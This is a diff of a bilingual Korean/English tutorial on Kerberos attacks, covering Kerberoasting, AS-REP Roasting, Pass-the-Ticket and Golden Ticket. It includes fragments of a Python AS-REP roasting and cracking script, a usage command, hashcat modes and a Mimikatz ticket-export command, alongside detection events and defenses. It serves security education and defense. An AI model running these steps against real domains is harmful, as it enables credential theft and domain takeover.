@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Kerberos 공격 — Kerberoasting·AS-REP Roasting·티켓 공격
 
 ## 1. Kerberos 인증 흐름
@@ -257,7 +263,7 @@ def batch_asrep_roast(
             username = futures[future]
             hash_ = future.result()
             if hash_:
-                print(f"[+] AS-REP 해시 획득: {username}")
+                print(f"[+] AS-REP hash obtained: {username}")
                 targets.append(KerberosTarget(username=username, hash_=hash_))
 
     return targets
@@ -298,21 +304,21 @@ def crack_kerberos_hashes(
                 if hash_prefix in hash_key:
                     target.cracked_password = password
                     cracked_count += 1
-                    print(f"[+] 크래킹 성공: {target.username}:{password}")
+                    print(f"[+] Cracked: {target.username}:{password}")
                     break
 
     return cracked_count
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="Kerberos 공격 자동화")
+    parser = argparse.ArgumentParser(description="Kerberos Attack Automation")
     sub = parser.add_subparsers(dest="cmd", required=True)
 
     asrep_p = sub.add_parser("asrep", help="AS-REP Roasting")
     asrep_p.add_argument("dc", help="DC IP")
     asrep_p.add_argument("domain")
     asrep_p.add_argument("-U", "--userlist", type=Path, required=True)
-    asrep_p.add_argument("-w", "--wordlist", type=Path, help="크래킹용 단어 목록")
+    asrep_p.add_argument("-w", "--wordlist", type=Path, help="Cracking wordlist")
     asrep_p.add_argument("--workers", type=int, default=10)
 
     args = parser.parse_args()
@@ -320,13 +326,13 @@ def main() -> None:
     match args.cmd:
         case "asrep":
             usernames = args.userlist.read_text().splitlines()
-            print(f"[*] {len(usernames)}개 계정 AS-REP Roasting 시작")
+            print(f"[*] Starting AS-REP Roasting for {len(usernames)} accounts")
             targets = batch_asrep_roast(args.dc, args.domain, usernames, args.workers)
-            print(f"[+] 해시 {len(targets)}개 획득")
+            print(f"[+] Obtained {len(targets)} hashes")
 
             if args.wordlist and targets:
                 cracked = crack_kerberos_hashes(targets, args.wordlist)
-                print(f"[+] 크래킹 성공: {cracked}/{len(targets)}")
+                print(f"[+] Cracked: {cracked}/{len(targets)}")
 
 
 if __name__ == "__main__":
@@ -344,3 +350,93 @@ if __name__ == "__main__":
 | Pass-the-Ticket | 비정상 티켓 출처 IP | Kerberos Armoring (FAST) |
 | Golden Ticket | krbtgt 해시 탈취 탐지 | krbtgt 정기 비밀번호 재설정 (2회) |
 | Overpass-the-Hash | NTLM → Kerberos 변환 탐지 | Credential Guard 활성화 |
+
+---
+
+<a name="english"></a>
+
+# Kerberos Attacks — Kerberoasting, AS-REP Roasting, and Ticket Attacks
+
+## 1. Kerberos Authentication Flow
+
+```
+Client          KDC (AS)           KDC (TGS)          Service
+    │                │                    │                 │
+    │─── AS-REQ ────>│                    │                 │
+    │  (pre-auth)    │                    │                 │
+    │<── AS-REP ─────│                    │                 │
+    │   (TGT issued) │                    │                 │
+    │                │                    │                 │
+    │──────── TGS-REQ (with TGT) ────────>│                 │
+    │<──────── TGS-REP (service ticket) ──│                 │
+    │                                     │                 │
+    │──────────── AP-REQ (service ticket) ────────────────>│
+    │<──────────── AP-REP (auth success) ─────────────────│
+```
+
+---
+
+## 2. Kerberoasting
+
+Kerberoasting requests TGS tickets for accounts with registered SPNs (service accounts) and cracks them offline. Any authenticated domain user can request service tickets for any SPN — the ticket is encrypted with the service account's password hash.
+
+**Attack steps:**
+1. Enumerate accounts with SPNs: `GetUserSPNs.py` or PowerShell
+2. Request TGS tickets for those accounts
+3. Crack the RC4-encrypted tickets offline with hashcat (mode 13100)
+
+**Defense:** Use gMSA (Group Managed Service Accounts) whose passwords are 240 characters and automatically rotated, or enforce AES-only encryption for service accounts.
+
+**Detection:** Event ID 4769 (TGS Request) with TicketEncryptionType = 0x17 (RC4-HMAC) in large quantities from a single source.
+
+---
+
+## 3. AS-REP Roasting
+
+Accounts with `DoNotRequirePreAuth` set (DONT_REQ_PREAUTH flag) respond to AS-REQ without verifying the client's identity. The AS-REP response is partially encrypted with the account's password hash, allowing offline cracking.
+
+Unlike Kerberoasting, AS-REP Roasting can be performed without any domain credentials if a username list is known.
+
+**hashcat mode:** 18200 (krb5asrep)
+
+**Defense:** Ensure pre-authentication is enabled for all accounts. This flag should never be disabled unless required by legacy applications.
+
+---
+
+## 4. Pass-the-Ticket (PtT)
+
+Kerberos tickets extracted from memory (`sekurlsa::tickets /export` in Mimikatz) or forged can be injected into a Windows session to authenticate as the ticket's owner without knowing the password. On Linux, `.ccache` files are used with `KRB5CCNAME` environment variable.
+
+---
+
+## 5. Golden Ticket
+
+A Golden Ticket is a forged TGT signed with the `krbtgt` account's NTLM hash. Since any TGT signed by krbtgt is trusted by the KDC, a Golden Ticket grants access to any service in the domain for any user (including non-existent ones) for up to 10 years.
+
+**Requirements:** krbtgt NTLM hash (obtained via DCSync), domain SID
+
+**Defense:** Reset the krbtgt password twice (two resets are required to invalidate all existing tickets).
+
+---
+
+## 6. Kerberos Attack Automation
+
+The automation script implements parallel AS-REP Roasting across a userlist using a thread pool, then maps cracked passwords back to usernames using the hashcat pot file.
+
+**Usage:**
+```bash
+python3 kerberos_attack.py asrep 10.10.10.100 corp.local \
+    -U userlist.txt -w /usr/share/wordlists/rockyou.txt --workers 20
+```
+
+---
+
+## 7. Detection and Defense
+
+| Attack | Detection | Defense |
+|--------|-----------|---------|
+| Kerberoasting | Spike in TGS-REQ (Event 4769, RC4 encryption) | Strong service account passwords (25+ chars) / gMSA |
+| AS-REP Roasting | Event 4768 with RC4 encryption type | Enable pre-authentication for all accounts |
+| Pass-the-Ticket | Anomalous ticket source IPs | Kerberos Armoring (FAST) |
+| Golden Ticket | krbtgt hash theft detection | Reset krbtgt password twice regularly |
+| Overpass-the-Hash | NTLM → Kerberos conversion detection | Enable Credential Guard |
